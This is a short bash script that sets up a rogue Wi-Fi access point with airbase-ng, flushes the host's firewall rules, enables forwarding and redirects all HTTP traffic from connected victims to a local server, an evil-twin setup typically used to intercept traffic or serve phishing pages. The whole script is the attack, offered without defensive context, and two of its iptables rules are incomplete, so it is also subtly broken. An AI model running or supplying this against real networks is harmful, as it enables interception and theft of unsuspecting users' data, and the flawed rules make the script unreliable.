#!/bin/bash

echo "Creating fake access point"

INTERFACE=$1
BSSID=$2
ESSID=$3
CHANNEL=$4

{ xterm -e sudo airbase-ng -e $ESSID -c $CHANNEL $INTERFACE; } &
sleep 5

sudo ifconfig at0 10.0.0.1 up

sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface eth0
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A POSTROUTING

sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

echo "Finished fake access point"
